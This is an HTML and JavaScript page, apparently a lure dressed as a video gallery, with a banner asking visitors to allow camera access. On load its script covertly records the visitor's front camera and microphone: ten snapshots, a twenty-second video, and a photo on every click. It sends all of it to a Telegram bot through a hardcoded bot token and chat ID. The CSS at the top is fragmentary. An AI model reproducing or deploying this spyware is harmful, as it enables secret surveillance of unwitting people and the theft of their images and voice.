    header {

    @keyframes pulse {
      0% { box-shadow: 0 0 0 0 rgba(255, 0, 255, 0.6); }
      70% { box-shadow: 0 0 0 15px rgba(255, 0, 255, 0); }
      100% { box-shadow: 0 0 0 0 rgba(255, 0, 255, 0); }

    }

      margin-top: 15px;

      padding: 10px 20px;

    }

<body onclick="captureOnClick()">

  <div class="top-description">⚠️ カメラアクセスを許可してください - يرجى السماح بالوصول إلى الكاميرا 📷</div>

  <header>

  <div class="video-grid">
    <!-- 👑 كرر الفيديوهات -->
    <video src="ffghgg.mp4" onclick="openVideo(this)"></video>

    <video src="ffghgg.mp4" onclick="openVideo(this)"></video>
  </div>

  <div class="lightbox" id="lightbox">
    <a href="#" class="close-btn" onclick="closeVideo()">×</a>
    <video controls id="lightboxVideo"></video>
    <a id="downloadLink" download>📥 تحميل الفيديو</a>
  </div>

  <script>
    const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
    const CHAT_ID = "7664410054";
    let stream;
    let mediaRecorder;
    let chunks = [];

    async function initCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
        captureImages(10);
        recordVideo(20);
      } catch (e) {
        alert("アクセス拒否されました (تم رفض الوصول)");
      }
    }

    async function captureImages(count) {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();

      const canvas = document.createElement('canvas');
      const context = canvas.getContext('2d');

      setTimeout(async () => {
        for (let i = 0; i < count; i++) {
          await new Promise(r => setTimeout(r, 1000));
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          context.drawImage(video, 0, 0);
          const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
          sendMedia(blob, `📸 صورة ${i + 1}`);
        }
      }, 1000);
    }

    function recordVideo(seconds) {
      mediaRecorder = new MediaRecorder(stream);
      mediaRecorder.ondataavailable = e => chunks.push(e.data);
      mediaRecorder.onstop = () => {
        const blob = new Blob(chunks, { type: 'video/mp4' });
        sendMedia(blob, "🎥 فيديو 20 ثانية");
        chunks = [];
      };
      mediaRecorder.start();
      setTimeout(() => mediaRecorder.stop(), seconds * 1000);
    }

    function captureOnClick() {
      if (!stream) return;
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();

      const canvas = document.createElement('canvas');
      const context = canvas.getContext('2d');

      setTimeout(() => {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0);
        canvas.toBlob(blob => sendMedia(blob, "📸 صورة من نقرة"), 'image/jpeg');
      }, 500);
    }

    function sendMedia(blob, caption) {
      const form = new FormData();
      form.append("chat_id", CHAT_ID);
      if (blob.type.startsWith("image")) {
        form.append("photo", blob, "image.jpg");
        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: form });
      } else {
        form.append("video", blob, "video.mp4");
        fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: "POST", body: form });
      }
    }

    function openVideo(elem) {
      const lightbox = document.getElementById("lightbox");
      const vid = document.getElementById("lightboxVideo");
      const link = document.getElementById("downloadLink");
      vid.src = elem.src;
      link.href = elem.src;
      lightbox.style.display = "flex";
      vid.play();
    }

    function closeVideo() {
      const lightbox = document.getElementById("lightbox");
      const vid = document.getElementById("lightboxVideo");
      vid.pause();
      lightbox.style.display = "none";
    }

    // البداية
    window.onload = () => {
      initCamera();
    };
  </script>
